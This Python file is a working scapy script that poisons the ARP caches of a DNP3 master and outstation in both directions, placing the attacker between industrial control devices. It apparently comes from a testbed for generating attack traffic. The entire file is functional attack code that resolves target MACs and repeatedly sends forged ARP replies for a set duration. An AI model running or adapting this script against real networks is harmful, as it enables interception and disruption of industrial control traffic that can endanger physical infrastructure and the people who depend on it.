"""ARP_POISONING — bidirectional ARP cache poisoning of master + outstation.

Tells the master that <outstation-ip> is at attacker MAC, and vice-versa.
Pure poisoning (no IP forwarding enabled here) — see mitm_dos.py for the
DoS variant.
"""
import argparse, time
from scapy.all import ARP, Ether, send, srp, conf
from dnp3 import now
from config import OUTSTATION_IP, MASTER_IP, ATTACKER_IFACE

def mac_of(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=2, iface=iface, verbose=False)
    for _, r in ans: return r.hwsrc
    raise RuntimeError(f"no ARP reply from {ip}")

def poison(target_ip, target_mac, spoof_ip, iface):
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, iface=iface, verbose=False)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", default=ATTACKER_IFACE)
    p.add_argument("--master", default=MASTER_IP)
    p.add_argument("--outstation", default=OUTSTATION_IP)
    p.add_argument("--duration", type=int, default=120)
    p.add_argument("--interval", type=float, default=2.0)
    a = p.parse_args()
    conf.iface = a.iface
    m_mac = mac_of(a.master, a.iface)
    o_mac = mac_of(a.outstation, a.iface)
    print(f"[{now()}] ARP_POISONING start: master={m_mac} outstation={o_mac}")
    end = time.time() + a.duration
    while time.time() < end:
        poison(a.master,     m_mac, a.outstation, a.iface)
        poison(a.outstation, o_mac, a.master,     a.iface)
        time.sleep(a.interval)
    print(f"[{now()}] ARP_POISONING stop")

if __name__ == "__main__":
    main()
